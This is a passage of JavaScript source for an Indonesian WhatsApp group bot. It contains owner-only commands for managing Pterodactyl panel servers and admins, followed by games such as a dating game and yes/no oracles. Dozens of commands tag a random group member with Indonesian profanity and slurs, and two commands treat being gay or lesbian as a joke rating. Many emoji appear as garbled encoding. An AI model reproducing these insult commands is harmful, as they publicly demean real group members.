"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return reply("Tidak ada admin panel")
var teks = "\n *ä¹‚ List admin panel pterodactyl*\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
teks += `\n* ID : *${i.attributes.id}*
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n`
})
await sock.sendMessage(m.chat, {text: teks}, {quoted: fakeQuoted})
}
break

//================================================================================

case "listpanel-v2": {
if (!isOwner) return reply(mess.owner)
let f = await fetch(domainV2 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
});
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return reply("Tidak Ada Server Bot")
let messageText = "\n *ä¹‚ List server panel pterodactyl*\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domainV2 + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikeyV2
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\n* ID : *${s.id}*
* Nama : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Disk : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n`
}
await sock.sendMessage(m.chat, {text: messageText}, {quoted: fakeQuoted})
}
break

//================================================================================

case "deladmin-v2": {
if (!isOwner) return reply(mess.owner)
if (!text) return reply("idnya")
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domainV2 + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return reply("Akun admin panel tidak ditemukan!")
await reply(`Berhasil menghapus akun admin panel *${capital(getid)}*`)
}
break

//================================================================================

case "delpanel-v2": {

if (!isOwner) return reply(mess.owner)
if (!text) return reply("idnya")
let f = await fetch(domainV2 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let result = await f.json()
let servers = result.data
let sections
let nameSrv
for (let server of servers) {
let s = server.attributes
if (Number(text) == s.id) {
sections = s.name.toLowerCase()
nameSrv = s.name
let f = await fetch(domainV2 + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (u.first_name.toLowerCase() == sections) {
let delusr = await fetch(domainV2 + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections == undefined) return reply("Server panel tidak ditemukan!")
reply(`Berhasil menghapus server panel *${capital(nameSrv)}*`)
}
break
///########## [ Fun ]
case 'tembak':
            case 'jadian': {
              if (!m.isGroup) return onlyGrup()
              let user = m.mentionedJid[0] || (m.quoted ? m.quoted.sender : "")
              if (!user) return reply(`*Tag/Reply Seseorang!*\n\nContoh:\n${prefix + command} @0`)
              if (user === m.sender) return reply("Halah mawunya jadian sama diri sendiriğŸ˜¢")
              if (user === botNumber) return reply("ğŸ˜“Aku hanya sebuah bot maaf")
              sock.jadian = sock.jadian ? sock.jadian : {}
              let pasangan = db.users[user].pacar
              let pasangan2 = db.users[m.sender].pacar
              if (pasangan2 === user) {
                reply(`Kamu kan udah jadian smaa dia ğŸ˜¤`)
              } else if (pasangan) {
                sock.sendTextWithMentions(m.chat, `Target udah punya pacarğŸ˜”ğŸ˜­\n\n@${pasangan.split("@")[0]} ayangmu mo diambilğŸ˜¢`, m)
              } else if (pasangan2) {
                sock.sendTextWithMentions(m.chat, `Hayoloo mau selingkuhğŸ˜”\n\n@${pasangan2.split("@")[0]} tengok nihh kelakuan ayangmuğŸ˜¤`, m)
              } else {
                let ktnmbk = [
                  "Ada saat di mana aku nggak suka sendiri. Tapi aku juga nggak mau semua orang menemani, hanya kamu yang kumau.",
                  "Aku baru sadar ternyata selama ini kamu kaya! Kaya yang aku cari selama ini. Kamu mau nggak jadi pacarku?",
                  "Aku berterima kasih pada mataku, sebab mata inilah yang menuntunku untuk menemukanmu.",
                  "Aku boleh kirim CV ke kamu nggak? Soalnya aku mau ngelamar jadi pacar.",
                  "Aku bukan yang terhebat, namun aku yakin kalau aku mampu membahagiakanmu dengan bermodalkan cinta dan kasih sayang, kamu mau kan denganku?",
                  "Aku hanya cowok biasa yang memiliki banyak kekurangan dan mungkin tak pantas mengharapkan cintamu, namun jika kamu bersedia menerimaku menjadi kekasih, aku berjanji akan melakukan apa pun yang terbaik untukmu. Maukah kamu menerima cintaku?",
                  "Aku ingin bilang sesuatu. Udah lama aku suka sama aku, tapi aku nggak berani ngomong. Jadi, kuputuskan untuk WA saja. Aku pengin kamu jadi pacarku.",
                  "Aku ingin mengungkapkan sebuah hal yang tak sanggup lagi aku pendam lebih lama. Aku mencintaimu, maukah kamu menjadi pacarku?",
                  "Aku ingin menjadi orang yang bisa membuatmu tertawa dan tersenyum setiap hari. Maukah kau jadi pacarku?",
                  "Aku mau chat serius sama kamu. Selama ini aku memendam rasa ke kamu dan selalu memperhatikanmu. Kalau nggak keberatan, kamu mau jadi pacarku?",
                  "Aku melihatmu dan melihat sisa hidupku di depan mataku.",
                  "Aku memang tidak mempunyai segalanya, tapi setidaknya aku punya kasih sayang yang cukup buat kamu.",
                  "Aku menyukaimu dari dulu. Kamu begitu sederhana, tetapi kesederhanaan itu sangat istimewa di selaput mataku. Akan sempurna jika kamu yang menjadi spesial di hati.",
                  "Aku naksir banget sama kamu. Maukah kamu jadi milikku?",
                  "Aku nggak ada ngabarin kamu bukan karena aku gak punya kuota atau pulsa, tapi lagi menikmati rasa rindu ini buat kamu. Mungkin kamu akan kaget mendengarnya. Selama ini aku menyukaimu.",
                  "Aku nggak pengin kamu jadi matahari di hidupku, karena walaupun hangat, kamu sangat jauh. Aku juga nggak mau kamu jadi udara, karena walaupun aku butuh dan kamu sangat dekat, tapi semua orang juga bisa menghirupmu. Aku hanya ingin kamu jadi darah yang bisa sangat dekat denganku.",
                  "Aku nggak tahu sampai kapan usiaku berakhir. Yang aku tahu, cintaku ini selamanya hanya untukmu.",
                  "Aku sangat menikmati waktu yang dihabiskan bersama hari ini. Kita juga sudah lama saling mengenal. Di hari yang cerah ini, aku ingin mengungkapkan bahwa aku mencintaimu.",
                  "Aku selalu membayangkan betapa indahnya jika suatu saat nanti kita dapat membina bahtera rumah tangga dan hidup bersama sampai akhir hayat. Namun, semua itu tak mungkin terjadi jika kita berdua sampai saat ini bahkan belum jadian. Maukah kamu menjadi kekasihku?",
                  "Aku siapkan mental untuk hari ini. Kamu harus menjadi pacarku untuk mengobati rasa cinta yang sudah tak terkendali ini.",
                  "Aku tahu kita gak seumur, tapi bolehkan aku seumur hidup sama kamu?",
                  "Aku tahu kita sudah lama sahabatan. Tapi nggak salah kan kalau aku suka sama kamu? Apa pun jawaban kamu aku terima. Yang terpenting itu jujur dari hati aku yang terdalam.",
                  "Aku tak bisa memulai ini semua terlebih dahulu, namun aku akan berikan sebuah kode bahwa aku menyukai dirimu. Jika kau mengerti akan kode ini maka kita akan bersama.",
                  "Aku yang terlalu bodoh atau kamu yang terlalu egois untuk membuat aku jatuh cinta kepadamu.",
                  "Apa pun tentangmu, tak pernah ku temukan bosan di dalamnya. Karena berada di sampingmu, anugerah terindah bagiku. Jadilah kekasihku, hey kamu.",
                  "Atas izin Allah dan restu mama papa, kamu mau nggak jadi pacarku?",
                  "Bagaimana kalau kita jadi komplotan pencuri? Aku mencuri hatimu dan kau mencuri hatiku.",
                  "Bahagia itu kalau aku dan kamu telah menjadi kita.",
                  "Besok kalau udah nggak gabut, boleh nggak aku daftar jadi pacar kamu. Biar aku ada kerjaan buat selalu mikirin kamu.",
                  "Biarkan aku membuatmu bahagia selamanya. Kamu hanya perlu melakukan satu hal: Jatuh cinta denganku.",
                  "Biarkan semua kebahagiaanku menjadi milikmu, semua kesedihanmu menjadi milikku. Biarkan seluruh dunia menjadi milikmu, hanya kamu yang menjadi milikku!",
                  "Biarlah yang lalu menjadi masa laluku, namun untuk masa kini maukah kamu menjadi masa depanku?",
                  "Bisakah kamu memberiku arahan ke hatimu? Sepertinya aku telah kehilangan diriku di matamu.",
                  "Bukanlah tahta ataupun harta yang aku cari, akan tetapi balasan cintaku yang aku tunggu darimu. Dijawab ya.",
                  "Caramu bisa membuatku tertawa bahkan di hari-hari tergelap membuatku merasa lebih ringan dari apa pun. Aku mau kamu jadi milikku.",
                  "Cinta aku ke kamu itu jangan diragukan lagi karena cinta ini tulus dari lubuk hati yang paling dalam.",
                  "Cintaku ke kamu tuh kayak angka 5 sampai 10. Nggak ada duanya. Aku mau kamu jadi satu-satunya wanita di hatiku.",
                  "Cowok mana yang berani-beraninya nyakitin kamu. Sini aku obati, asal kamu mau jadi pacar aku.",
                  "Hai, kamu lagi ngapain? Coba deh keluar rumah dan lihat bulan malam ini. Cahayanya indah dan memesona, tapi akan lebih indah lagi kalau aku ada di sampingmu. Gimana kalau kita jadian, supaya setelah malam ini bisa menatap rembulan sama-sama?",
                  "Hidupku indah karena kamu bersamaku, kamu membuatku bahagia bahkan jika aku merasa sedih dan rendah. Senyummu menerangi hidupku dan semua kegelapan menghilang. Maukah kamu menjadi milikku?",
                  "Ini bukan rayuan, tapi ini yang aku rasakan. Aku ingin bertukar tulang denganmu. Aku jadi tulang punggungmu, kamu jadi tulang rusukku. Jadian yuk!",
                  "Ini cintaku, ambillah. Ini jiwaku, gunakan itu. Ini hatiku, jangan hancurkan. Ini tanganku, pegang dan bersama-sama kita akan membuatnya abadi.",
                  "Izinkan aku mengatakan sesuatu yang menurutku sangat penting. Hey, kau punya tempat di hatiku yang tidak bisa dimiliki oleh orang lain. Tetaplah di sana dan jadilah kekasihku. Mau?",
                  "Jika aku bisa memberimu hadiah, aku akan memberimu cinta dan tawa, hati yang damai, mimpi dan kegembiraan khusus selamanya. Biarkan aku melakukannya sekarang.",
                  "Kalau aku matahari, kamu mau nggak jadi langitku? Biar setiap saat setiap waktu bisa selalu bersama tanpa terpisah waktu.",
                  "Kalau kamu membuka pesan ini, berarti kamu suka sama aku. Kalau kamu membalas pesan ini, artinya kamu sayang sama aku. Kalau kamu mengabaikan pesan ini, berarti kamu cinta sama aku. Kalau kamu menghapus pesan ini, artinya kamu mau menerimaku jadi pacarmu.",
                  "Kalau kau bertanya-tanya apakah aku mencintaimu atau tidak, jawabannya adalah iya.",
                  "Kamu adalah satu-satunya yang lebih mengerti aku daripada diriku sendiri. Kamu adalah satu-satunya yang dapat ku bagi segalanya, bahkan rahasia pribadiku. Aku ingin kamu selalu bersamaku. Aku mencintaimu.",
                  "Kamu harus membiarkan aku mencintaimu, biarkan aku menjadi orang yang memberimu semua yang kamu inginkan dan butuhkan.",
                  "Kamu itu beda dari cewek lain, kamu antik jarang ditemukan di tempat lain. Maukah kamu jadi pacar aku?",
                  "Kamu kenal Iwan nggak? Iwan to be your boy friend.",
                  "Kamu mau nggak jadi matahari di kehidupanku? Kalau mau, menjauhlah 149.6 juta KM dari aku sekarang!",
                  "Kamu nggak capek HTS-an sama aku? Aku capek tiap hari jemput kamu, nemenin kamu pas lagi bad mood, menghibur kamu pas lagi sedih. Kita pacaran aja, yuk?",
                  "Kamu nggak sadar ya, nggak perlu capek nyari kesana kemari, orang yang tulus mencintai kamu ada di depan mata. Iya, aku.",
                  "Kamu pantas mendapatkan yang terbaik, seseorang yang akan mendukungmu tanpa batas, membiarkanmu tumbuh tanpa batas, dan mencintaimu tanpa akhir. Apakah kamu akan membiarkan aku menjadi orangnya?",
                  "Kamu tahu enggak kenapa aku ngambil jurusan elektro? Karena aku mau bikin pembangkit listrik tenaga cinta kita, supaya rumah tangga kita nanti paling terang.",
                  "Kamu tahu kenapa hari ini aku menyatakan semua ini padamu? Karena aku lebih memilih untuk malu karena menyatakan cinta ditolak ketimbang menyesal karena orang lain yang lebih dulu menyatakannya.",
                  "Kamu telah hidup dalam mimpiku untuk waktu yang lama, bagaimana jika menjadikannya nyata untuk sekali saja?",
                  "Kenapa aku baru sadar, ternyata selama ini hatiku nyaman bersanding denganmu. Aku mau kamu jadi milikku.",
                  "kepada cewek incaran bukanlah perkara yang mudah. Ada banyak hal yang perlu dipertimbangkan agar cintamu bisa diterima si doi. Selain memilih waktu yang tepat, kata-kata untuk nembak cewek pun harus dipersiapkan.",
                  "Ketika aku bertemu denganmu, aku tak peduli dengan semuanya. Namun, ketika kamu pergi jauh dariku aku selalu mengharapkanmu. Dan apakah ini cinta?",
                  "Ketika engkau memandangku, engkau akan melihat fisikku. Tetapi ketika engkau melihat hatiku, engkau akan menemukan dirimu sendiri ada di sana.",
                  "Ketika Hawa tercipta buat sang Adam, begitu indah kehidupan mereka izinkan aku menjadi sang Adam/Hawa buatmu karena aku sangat mencintaimu.",
                  "Ketika mata ini memandang raut wajahmu yang indah, hanya tiga kata yang terucap dari lubuk hatiku yang paling dalam 'aku cinta kamu'.",
                  "Kita udah saling tahu masa lalu masing-masing. Tapi itu tidak penting karena sekarang aku hanya ingin membicarakan tentang masa depan. Mulai hari ini dan seterusnya, maukah kamu menjadi pacarku?",
                  "Ku beranikan hari ini untuk mengungkapkan yang selama ini menjadi resah. Resah jika kamu tak menjadi milikku selamanya.",
                  "Lebih spesial dari nasi goreng, lebih indah dari purnama. Ya, jika kamu yang temani akhir hidupku.",
                  "Maaf sebelumnya karena cuma bisa bilang lewat WA. Sebenarnya, selama ini aku memendam cinta dan aku ingin kamu jadi pacarku. Mau?",
                  "Makanan busuk memanglah bau, kalau dimakan rasanya pahit sepahit jamu. Sebenarnya aku ingin kamu tahu, aku mau kamu terima cintaku.",
                  "Makan tahu bumbu petis. Merenung sambil makan buah duku. Aku bukan lelaki yang romantis. Namun, maukah kau jadi pacarku?",
                  "Makasih, ya, selama ini sudah mau temani aku. Entah itu dalam suka ataupun duka. Tapi sekarang aku mau kamu berubah. Aku mau kamu bukan lagi jadi temanku, tapi aku mau kamu jadi pacarku.",
                  "Malam ini sangat indah dengan cahaya rembulan yang memesona namun akan lebih indah kalau kamu resmi menjadi milikku.",
                  "Mataku mencarimu ketika kamu tidak ada. Hatiku sakit ketika aku tidak menemukanmu. Kamu adalah alasan untuk semua kebahagiaanku dan tanpamu hidupku akan sangat membosankan. Maukah kamu terus bersamaku?",
                  "Mau jadi pacarku nggak, lagi gabut nih. Coba dulu 1 bulan kalau nyaman lanjut deh.",
                  "Menjadi teman memang menyenangkan. Akan lebih membahagiakan jika kamu menjadi milikku.",
                  "Meski jarang buat kamu tertawa, setidaknya saya tidak selalu buat kamu sedih. Tapi kalau akhirnya humor saya tidak membuatmu tertawa lagi, semoga sedih saya bisa kamu tertawakan, ya. - Zarry Hendrik",
                  "Meskipun aku memiliki banyak hal untuk dikatakan, tetapi kata-kataku bersembunyi dariku dan aku tidak bisa mengungkapkannya. Hal sederhana yang ingin aku katakan adalah aku mencintaimu hari ini dan selalu.",
                  "Mungkin aku bukan Obama, tapi aku senang kalau bisa manggil kamu, o sayang. Kamu mau nggak mulai saat ini aku panggil seperti itu?",
                  "Mungkin aku tak sanggup menyeberangi lautan, menghantam karang atau menerjang badai. Tapi satu yang aku sanggup, membuatmu bahagia. Izinkan aku membuktikannya, ya!",
                  "Neng, bakar-bakaran yuk! | Bakar apa? | Kita bakar masa lalu dan buka lembaran baru dengan cinta kita.",
                  "Nggak perlu basa basi. Kita udah kenal lama, aku suka kamu apa adanya. Jadian yuk!",
                  "Pepatah mengatakan, empat sehat lima sempurna. Namun, aku tidak merasakan kesempurnaan itu sebelum aku merasakan kasih sayangmu.",
                  "Saatnya aku mengungkapkan perasaan yang terdalam kepadamu. Aku ingin kamu tahu bahwa aku mencintaimu seperti aku tidak pernah mencintai siapa pun sebelumnya.",
                  "Saking jatuh cintanya aku sama kamu. Mendengar kamu kentut aja aku sudah bahagia.",
                  "Satu tambah satu sama dengan dua. Aku tanpamu nggak bisa apa-apa. Satu dua tiga sepuluh. Aku maunya kamu jadi pacarkuh.",
                  "Secantik-canriknya kamu, itu nggak ada gunanya kalau nggak jadi punyaku.",
                  "Sejak kenal kamu, bawaannya pengin belajar terus. Belajar jadi yang terbaik. Untuk selanjutnya, kamu mau nggak ngebimbing aku, selalu ada di sampingku?",
                  "Senjata bertuah amatlah sakti. Kalah oleh iman nan hakiki. Maukah kau jadi orang yang aku kasihi? Aku janji cintaku sampai mati.",
                  "Seseorang bermimpi tentangmu setiap malam. Seseorang tidak bisa bernapas tanpamu, kesepian. Seseorang berharap suatu hari kau akan melihatnya. Seseorang itu adalah aku.",
                  "Setelah hari berlalu, aku yakin kamu pilihanku.",
                  "Setelah sekian lama bersama, aku ingin kita tidak hanya sekadar teman saja. Aku yakin kamu paham maksudku, dan aku berharap semoga kamu setuju. Aku mencintaimu.",
                  "Suatu ketika, ada seorang laki-laki yang mencintai perempuan yang tawanya bagaikan sebuah pertanyaan yang seumur hidup ingin dijawabnya. Akulah laki-laki itu, seorang laki-laki yang sedang menginginkan perempuan untuk jawaban di hidupnya. Perempuan itu adalah kamu.",
                  "Suka maupun duka, senang maupun susah, kamu telah menghiasi hariku saat aku bersamamu dan aku mau kita selamanya dekat denganmu karena aku mau kamu jadi pacar aku?",
                  "Tak ada alasan yang pasti dan jelas kenapa aku cinta kamu, tapi yang pasti aku menginginkan aku bahagia denganmu dan tak ingin sampai kamu terluka.",
                  "Tak bisa dibayangkan jika di dunia ini tak ada yang namanya cinta. Ya, rasa cinta bagi sebagian orang memberi keindahan yang membuat hari-hari semakin berwarna. Apalagi jika perasaan cinta yang kita punya dibalas oleh orang yang kita suka.",
                  "Tak hanya menyenangkan, aku yakin kamu dapat diandalkan di masa depan.",
                  "Tak ragu lagi untuk ungkapkan kepada seseorang yang ada di hati. Itu adalah kamu.",
                  "Telah banyak waktuku terlewati bersamamu, suka maupun duka senang maupun susah kamu telah menghiasi hariku saat aku bersamamu dan aku mau kita selamanya dekat denganmu. Karena aku mau kamu jadi pacar aku?",
                  "Tidak peduli seberapa sederhanya dan ketidakjelasan kamu. Tapi bagi aku, kamu adalah kesempurnaan yang memiliki kejelasan. Aku mau kamu jadi pacarku.",
                  "Untuk apa memajang foto berdua? Yang aku mau fotomu ada dalam buku nikahku kelak. Maukah kamu jadi pacarku?"
                ]
                let katakata = await pickRandom(ktnmbk)
                let teks = `*Love Message...*\n\n@${m.sender.split("@")[0]}\nâ¤ï¸â¤ï¸\n@${user.split("@")[0]}\n\n"${katakata}"`
                sock.jadian[user] = [m.sender]
                sock.sendTextWithMentions(m.chat, teks, m),
                  sock.sendTextWithMentions(m.chat, `Kamu baru saja mengajak @${user.split("@")[0]} jadian\n\n@${user.split("@")[0]} silahkan beri keputusanğŸ‰\n${prefix}terima\n${prefix}tolak`, m)
              }
            }
            break

            case 'terima': {
              if (!m.isGroup) return onlyGrup()
              if (sock.jadian[m.sender]) {
                let user = sock.jadian[m.sender][0]
                db.users[user].pacar = m.sender
                db.users[m.sender].pacar = user
                sock.sendTextWithMentions(m.chat, `HoreeeğŸ‰ğŸ‰\n\n@${m.sender.split("@")[0]} jadian dengan\nâ¤ï¸ @${user.split("@")[0]}\n\nSemoga langgeng ğŸ¥³ğŸ™‚`, m)
                delete sock.jadian[m.sender]
              } else {
                reply("ihh kaga ada yang nembak kamu ğŸ™„")
              }
            }
            break

            case 'tolak': {
              if (!m.isGroup) return onlyGrup()
              if (sock.jadian[m.sender]) {
                let user = sock.jadian[m.sender][0]
                sock.sendTextWithMentions(m.chat, `@${user.split("@")[0]} ditolak njir ğŸ˜“`, m)
                delete sock.jadian[m.sender]
              } else {
                reply("Dihh lu nolak siapa, setan ? ğŸ™„")
              }
            }
            break

            case 'putus': {
              if (!m.isGroup) return onlyGrup()
              let pasangan = db.users[m.sender].pacar
              if (pasangan) {
                db.users[m.sender].pacar = ""
                db.users[pasangan].pacar = ""
                sock.sendTextWithMentions(m.chat, `Kamu putus sama @${pasangan.split("@")[0]} ğŸ˜“ğŸ¤”`, m)
              } else {
                reply("Kamu jomblo ngapain putus njir ğŸ™„")
              }
            }
            break

            case 'cekpacar':
            case 'cekpasangan': {
              if (!m.isGroup) return onlyGrup()
              try {
                let user = m.mentionedJid[0] || (m.quoted ? m.quoted.sender : "")
                if (!user) return reply(`*Tag/Reply Seseorang!*\n\nContoh:\n${prefix + command} @0`)
                let pasangan = db.users[user].pacar
                if (pasangan) {
                  sock.sendTextWithMentions(m.chat, `@${user.split("@")[0]} udah â¤ï¸ sama @${pasangan.split("@")[0]}`, m)
                } else {
                  sock.sendTextWithMentions(m.chat, `@${user.split("@")[0]} masih jomblo tuhğŸ¥³`, m)
                }
              } catch (error) {
                sock.sendTextWithMentions(m.chat, `@${user.split("@")[0]} tidak ada didalam databaseğŸ˜`, m)
              }
            }
            break

            case 'top': {
              if (!m.isGroup) return onlyGrup()
              let kategori = q;
              if (!kategori) return reply(`Penggunaan ${command} [Kategori]\n\nContoh: ${command} orang pintar`);

              let member = participants.map(u => u.jid).filter(v => v !== sock.user.jid)
              let top5 = [];
              for (let i = 0; i < 5; i++) {
                top5.push(member[Math.floor(Math.random() * member.length)]);
              }
              let mention = top5.map((user, index) => `${index + 1}. @${user.split('@')[0]}`).join('\n');
              sock.sendMessage(m.chat, {
                text: `  â˜Ÿ Top 5 ${kategori} â˜Ÿ\n\n${mention}`,
                mentions: top5
              }, {
                quoted: fakeQuoted
              });
            }
            break
            case 'bego':
            case 'goblok':
            case 'janda':
            case 'perawan':
            case 'babi':
            case 'tolol':
            case 'pekok':
            case 'jancok':
            case 'pinter':
            case 'pintar':
            case 'asu':
            case 'bodoh':
            case 'gay':
            case 'lesby':
            case 'bajingan':
            case 'jancok':
            case 'anjing':
            case 'anjg':
            case 'anjj':
            case 'anj':
            case 'ngentod':
            case 'ngentot':
            case 'monyet':
            case 'mastah':
            case 'newbie':
            case 'bangsat':
            case 'bangke':
            case 'sange':
            case 'sangean':
            case 'dakjal':
            case 'horny':
            case 'wibu':
            case 'puki':
            case 'puqi':
            case 'peak':
            case 'pantex':
            case 'pantek':
            case 'setan':
            case 'iblis':
            case 'cacat':
            case 'yatim':
            case 'piatu': {
              if (!m.isGroup) return onlyGrup()
              let member = participants.map(u => u.jid).filter(v => v !== sock.user.jid)
              let org = member[Math.floor(Math.random() * member.length)];
              sock.sendMessage(m.chat, {
                text: `Anak ${command} di sini adalah @${org.split('@')[0]}`,
                mentions: [org]
              }, {
                quoted: fakeQuoted
              })
            }
            break


            case 'apakah': {
              if (!text) return reply(`Contoh: ${cmd} saya ganteng?`)
              const jawaban = ['Iya', 'Mungkin iya', 'Mungkin', 'Gak', 'Mungkin gak', 'Gak tau']
              const coli = jawaban[Math.floor(Math.random() * jawaban.length)]
              reply(`*Pertanyaan:* Apakah ${text}\n*Jawaban:* ${coli}`)
            }
            break

            case 'bisakah': {
              if (!text) return reply(`Contoh: ${cmd} saya jadi kaya?`)
              const jawaban = ['Bisa banget', 'Bisa', 'Mungkin bisa', 'Mungkin', 'Gak bisa', 'Mungkin gak bisa', 'Gak bisa lah', 'Gak tau']
              const coli = jawaban[Math.floor(Math.random() * jawaban.length)]
              reply(`*Pertanyaan:* Bisakah ${text}\n*Jawaban:* ${coli}`)
            }
            break

            case 'kapankah': {
              if (!text) return reply(`Contoh: ${cmd} saya kaya?`)
              const jawabanWaktu = [
                'Bentar lagi',
                'Nunggu kiamat dulu',
                'Kapan-kapan',
                'Besok',
                'Pas lu tidur',
                'Gw juga gak tau kapan'
              ]
              const waktuRandom = Math.floor(Math.random() * 10) + 1
              const unitWaktu = ['minggu', 'bulan', 'tahun']
              const unitWaktuRandom = unitWaktu[Math.floor(Math.random() * unitWaktu.length)]
              const jawaban = [...jawabanWaktu, `${waktuRandom} ${unitWaktuRandom} lagi`]
              const hasilJawaban = jawaban[Math.floor(Math.random() * jawaban.length)]
              reply(`*Pertanyaan:* Kapankah ${text}\n*Jawaban:* ${hasilJawaban}`)
            }
            break

            case 'cekganteng': {
              if (!pushname) return reply(`Contoh: ${cmd} nama seseorang atau tag`)
              const jawaban1 = ['ganteng', 'jelek']
              const coli1 = jawaban1[Math.floor(Math.random() * jawaban1.length)]

              const jawaban = [randomNomor(2, 100) + `% ${coli1}`, 'Ganteng', 'Ganteng amat', 'Lumayan', 'Jelek', 'Jelek amat']
              const coli = jawaban[Math.floor(Math.random() * jawaban.length)]
              sock.sendTextWithMentions(m.chat, `*Pertanyaan:* Cekganteng ${pushname}\n*Jawaban:* ${coli}`, m)
            }
            break

            case 'cekcantik': {
              if (!pushname) return reply(`Contoh: ${cmd} nama seseorang atau tag`)
              const jawaban1 = ['cantik', 'jelek']
              const coli1 = jawaban1[Math.floor(Math.random() * jawaban1.length)]

              const jawaban = [randomNomor(2, 100) + `% ${coli1}`, 'Cantik', 'Cantik amat', 'Lumayan', 'Jelek', 'Jelek amat']
              const coli = jawaban[Math.floor(Math.random() * jawaban.length)]
              sock.sendTextWithMentions(m.chat, `*Pertanyaan:* Cekcantik ${pushname}\n*Jawaban:* ${coli}`, m)
            }
            break

            case 'cekgay': {
              if (!pushname) return reply(`Contoh: ${cmd} nama seseorang atau tag`)
              const jawaban1 = ['gay', 'raja gay']
              const coli1 = jawaban1[Math.floor(Math.random() * jawaban1.length)]

              const jawaban = [randomNomor(2, 100) + `% ${coli1}`, 'Gay', 'Gay amat', 'Mayan', 'Gak', 'Gak lah']
              const coli = jawaban[Math.floor(Math.random() * jawaban.length)]
              sock.sendTextWithMentions(m.chat, `*Pertanyaan:* Cekgay ${pushname}\n*Jawaban:* ${coli}`, m)
            }
            break

            case 'ceklesbi': {
              if (!pushname) return reply(`Contoh: ${cmd} nama seseorang atau tag`)
              const jawaban1 = ['lesbi', 'ratu lesbi']
              const coli1 = jawaban1[Math.floor(Math.random() * jawaban1.length)]

              const jawaban = [randomNomor(2, 100) + `% ${coli1}`, 'Lesbi', 'Lesbi amat', 'Mayan', 'Gak', 'Gak lah']
              const coli = jawaban[Math.floor(Math.random() * jawaban.length)]
              sock.sendTextWithMentions(m.chat, `*Pertanyaan:* Ceklesbi ${pushname}\n*Jawaban:* ${coli}`, m)
            }
            break

            case 'sifat':
            case 'ceksifat': {
              if (!pushname) return reply(`Contoh: ${cmd} nama seseorang atau tag`)
              const sifat = [
                'Periang', 'Pemalu', 'Pendiam', 'Perhatian', 'Sabar', 'Cepat marah',
                'Ceroboh', 'Pekerja keras', 'Ambisius', 'Bijaksana', 'Manja', 'Kreatif',
                'Penyayang', 'Suka membantu', 'Pendendam', 'Penuh semangat', 'Romantis',
                'Cepat bosan', 'Penuh rencana', 'Suka menunda', 'Penuh rahasia',
                'Cuek', 'Penuh percaya diri', 'Pemikir', 'Suka bercanda', 'Jujur',
                'Penyendiri', 'Penuh kejutan', 'Pemalu tapi hangat', 'Bergairah',
                'Suka berdiskusi', 'Tegas', 'Suka menyendiri', 'Ramah', 'Misterius',
                'Perasa', 'Bijak', 'Tertutup', 'Suka tantangan', 'Optimis', 'Pencemas',
                'Suka menjadi pusat perhatian', 'Setia', 'Suka berpetualang', 'Gugup',
                'Sensitif', 'Suka ngatur', 'Tangguh', 'Serius', 'Mudah marah',
                'Pandai berdamai', 'Terlalu perfeksionis', 'Sederhana', 'Penuh kasih sayang',
                'Penuh energi', 'Introvert', 'Extrovert', 'Ambivert', 'Kocak', 'Logis',
                'Penyendiri tapi bisa bersosialisasi', 'Penuh ide', 'Sangat disiplin',
                'Berani mengambil risiko', 'Suka mengalah', 'Senang bergaul', 'Suka berolahraga',
                'Mudah terpengaruh', 'Bergantung pada orang lain', 'Penuh semangat hidup',
                'Terlalu banyak bicara', 'Sangat memperhatikan detail', 'Suka memberi nasihat'
              ]
              const coli = sifat[Math.floor(Math.random() * sifat.length)]
              reply(`*Pertanyaan:* Ceksifat ${pushname}\n*Jawaban:* ${coli}`)
            }
            break

            case 'cekhobi':
            case 'cekhoby':
            case 'cekhobby': {
              if (!pushname) return reply(`Contoh: ${cmd} nama seseorang atau tag`)
              const hobi = [
                'Membaca buku', 'Berenang', 'Olahraga', 'Memasak', 'Menulis', 'Bermain game',
